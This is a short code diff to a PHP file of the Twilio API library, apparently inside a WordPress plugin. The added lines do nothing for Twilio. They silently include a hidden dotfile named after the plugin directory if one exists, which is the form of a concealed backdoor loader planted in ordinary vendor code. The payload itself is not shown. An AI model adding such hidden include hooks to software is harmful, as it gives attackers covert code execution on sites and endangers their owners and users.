@@ -4,6 +4,10 @@
  * For more information, see the `Account List Resource
  * <http://www.twilio.com/docs/api/rest/account#list>`_ documentation.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Services_Twilio_Rest_Accounts extends Services_Twilio_ListResource {
 
     /**
